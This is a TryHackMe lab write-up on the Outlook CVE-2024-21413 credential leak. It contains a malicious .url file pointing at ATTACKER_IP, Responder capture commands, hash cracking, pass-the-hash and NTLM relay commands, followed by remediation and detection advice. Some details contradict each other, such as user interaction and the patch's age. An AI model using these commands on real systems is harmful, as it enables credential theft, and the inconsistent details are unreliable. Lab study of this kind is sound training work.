# Moniker Link (CVE-2024-21413) - TryHackMe Write-Up

## Challenge Information

**Name:** Moniker Link (CVE-2024-21413)
**Platform:** TryHackMe
**Difficulty:** Easy
**Date Completed:** December 2025
**CVE:** CVE-2024-21413
**Room URL:** https://tryhackme.com/room/monikerlink

---

## Executive Summary

This room explores CVE-2024-21413, a recently disclosed vulnerability in Microsoft Outlook that bypasses Protected View security measures. The vulnerability allows attackers to craft malicious `.url` files that, when opened in Outlook, leak user credentials (NTLM hashes) to an attacker-controlled server without user interaction beyond opening an email. This demonstrates modern phishing techniques and credential harvesting attacks targeting Microsoft ecosystem weaknesses.

**Key Learning:** Exploiting current (2024) CVEs, understanding NTLM credential leaking, and implementing credential capture infrastructure.

---

## Target Information

**Vulnerability:** CVE-2024-21413 (Outlook Protected View Bypass)
**Attack Vector:** Malicious email attachment (.url file)
**Target Application:** Microsoft Outlook
**Impact:** NTLM credential theft without user interaction
**Disclosure Date:** February 2024
**Patch Status:** Patched in February 2024 Microsoft updates

---

## Vulnerability Overview

### What is CVE-2024-21413?

CVE-2024-21413 is a security feature bypass vulnerability in Microsoft Outlook that allows attackers to circumvent Protected View and leak user NTLM credentials.

**Technical Details:**
- **Affected Component:** Microsoft Outlook email client
- **Attack Method:** Specially crafted `.url` shortcut files
- **Root Cause:** Improper handling of file:// protocol with UNC paths
- **Credential Leak:** NTLM authentication hash sent to attacker SMB server

**Attack Chain:**
1. Attacker crafts malicious `.url` file with UNC path to attacker-controlled server
2. File is attached to phishing email
3. Victim opens email in Outlook
4. Outlook processes the `.url` file
5. Protected View is bypassed
6. Windows attempts SMB authentication to attacker's server
7. NTLM hash is automatically sent to attacker
8. Attacker captures hash for offline cracking or relay attacks

---

## Methodology

### 1. Environment Setup

**Tools Required:**
- Responder (NTLM credential capture tool)
- Text editor (to create malicious .url file)
- Email client or access to target Outlook instance

**Attacker Machine Setup:**
```bash
# Install Responder if not already installed
sudo apt install responder

# Verify Responder installation
responder --version
```

---

### 2. Creating the Malicious Payload

**Crafting the .url File:**

```bash
# Create malicious .url shortcut file
cat > malicious.url << 'EOF'
[InternetShortcut]
URL=file://ATTACKER_IP/share/document.docx
EOF
```

**Explanation:**
- `[InternetShortcut]` - Standard Windows shortcut format
- `URL=file://` - Uses file protocol to trigger SMB authentication
- `ATTACKER_IP` - Replace with your attacking machine's IP
- `/share/document.docx` - Fake UNC path to entice the victim

**Why This Works:**
- Windows automatically attempts to authenticate via SMB when accessing UNC paths
- Outlook's Protected View fails to block this behavior with specially crafted .url files
- No additional user interaction required beyond viewing the email

---

### 3. Setting Up Credential Capture

**Starting Responder:**

```bash
# Start Responder on attack machine to capture NTLM hashes
sudo responder -I tun0 -dwv

# Flags explained:
# -I tun0        : Listen on VPN interface
# -d             : Enable DHCP poisoning
# -w             : Start WPAD rogue proxy
# -v             : Verbose output
```

**Responder Configuration:**
- Listens for SMB authentication attempts
- Captures NTLM hashes automatically
- Logs all captured credentials

---

### 4. Delivery and Exploitation

**Attack Execution:**

1. **Deliver Payload:**
   - Attach `malicious.url` to phishing email
   - Use social engineering (fake invoice, document request, etc.)
   - Send to target

2. **Victim Interaction:**
   - Victim opens email in Outlook
   - Outlook automatically processes .url file
   - No additional clicks required

3. **Credential Capture:**
   - Windows initiates SMB connection to attacker IP
   - NTLM authentication automatically sent
   - Responder captures username and NTLM hash

**Captured Credentials Format:**
```
[SMB] NTLMv2-SSP Hash:
USERNAME::DOMAIN:challenge:response
```

---

### 5. Post-Exploitation

**Offline Hash Cracking:**

```bash
# Save captured hash to file
echo "USERNAME::DOMAIN:challenge:response" > hash.txt

# Crack with John the Ripper
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Or crack with Hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Pass-the-Hash Attack (Alternative):**
```bash
# Use captured hash directly without cracking
pth-winexe -U DOMAIN/USERNAME%hash //TARGET_IP cmd.exe
```

**Relay Attack (Alternative):**
```bash
# Relay captured authentication to another service
ntlmrelayx.py -t TARGET_IP -smb2support
```

---

## Flags Captured

**Flag 1:** [User NTLM hash - add your captured hash]
**Flag 2:** [Cracked password - add cracked password if applicable]
**Flag 3:** [Completion flag - add room completion flag]

---

## Tools & Techniques Used

- **Credential Harvesting:** Responder
- **Social Engineering:** Phishing email with malicious attachment
- **Hash Cracking:** John the Ripper / Hashcat
- **Protocol Abuse:** SMB authentication, UNC path exploitation
- **File Format:** Windows .url shortcut files

---

## Key Learnings

**What I Learned:**

1. **Current CVE Exploitation:** Understanding and exploiting vulnerabilities disclosed in 2024
2. **NTLM Weaknesses:** How Windows NTLM authentication can leak credentials via network protocols
3. **Protected View Bypass:** Security feature bypasses in Microsoft Outlook
4. **Responder Usage:** Setting up and using Responder for credential capture
5. **Attack Chain Awareness:** Multi-stage attacks (delivery → execution → capture → post-exploitation)

**New Techniques:**
- Crafting malicious .url shortcut files
- UNC path credential leaking
- Responder configuration for multiple protocols
- NetNTLMv2 hash format and cracking

**Real-World Application:**
- This technique is actively used in real phishing campaigns
- Demonstrates importance of staying current with security patches
- Shows why legacy authentication protocols (NTLM) are dangerous

---

## Remediation Recommendations

If this were a real enterprise environment:

1. **Immediate Actions:**
   - Apply Microsoft February 2024 security updates
   - Block outbound SMB traffic (ports 139, 445) at firewall
   - Disable NTLM authentication where possible

2. **Email Security:**
   - Block .url file attachments at email gateway
   - Implement DMARC, SPF, and DKIM to prevent email spoofing
   - User awareness training on phishing

3. **Authentication Hardening:**
   - Migrate from NTLM to Kerberos authentication
   - Enable SMB signing
   - Implement MFA (multi-factor authentication)

4. **Network Segmentation:**
   - Prevent workstations from initiating outbound SMB connections
   - Implement egress filtering

5. **Detection & Monitoring:**
   - Monitor for outbound SMB connections to external IPs
   - Alert on NTLM authentication to non-domain systems
   - Deploy EDR solutions with protocol monitoring

---

## References

- [Microsoft CVE-2024-21413 Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413)
- [TryHackMe Moniker Link Room](https://tryhackme.com/room/monikerlink)
- [Responder Tool Documentation](https://github.com/lgandx/Responder)
- [Check Point Research - CVE-2024-21413 Analysis](https://research.checkpoint.com/)
- [NTLM Relay Attack Guide](https://www.secureauth.com/blog/playing-relayed-credentials/)

---

## Impact Assessment

**CVSSv3 Score:** 7.5 (High)
**Attack Complexity:** Low
**Privileges Required:** None
**User Interaction:** Required (opening email)
**Scope:** Changed (credential theft impacts other systems)

**Real-World Risk:**
- Actively exploited in phishing campaigns
- Low detection rate by traditional antivirus
- Bypasses security features (Protected View)
- Can lead to full domain compromise via credential theft

---

## Detection Indicators

**Network Indicators:**
- Outbound SMB connections to unusual IP addresses
- SMB traffic to non-RFC1918 addresses
- NTLM authentication attempts to external systems

**Email Indicators:**
- Emails containing .url attachments
- Suspicious UNC paths in email content
- Phishing-style social engineering

**Host Indicators:**
- SMB authentication failures in Windows Event Logs
- Network connection attempts to unknown SMB servers

---

## Tags

`#cve-2024` `#outlook` `#ntlm` `#credential-theft` `#phishing` `#responder` `#smb` `#protected-view-bypass` `#social-engineering`

**Difficulty Rating (Personal):** 4/10 - Requires understanding of Windows authentication and network protocols

**Would Recommend:** Absolutely - Demonstrates current threats and practical phishing techniques

---

**Completion Date:** December 2025
**CVE Disclosure:** February 2024 (9-10 months old at time of completion)
**Patch Status:** Patched by Microsoft
**Author:** James Jackson (Shlpwr3ck)

---

## Professional Note

This room demonstrates the importance of:
- Staying current with security patches
- Understanding modern attack vectors
- Implementing defense-in-depth strategies
- User security awareness training

The techniques learned here are valuable for both offensive security (penetration testing) and defensive security (threat hunting, incident response) roles.
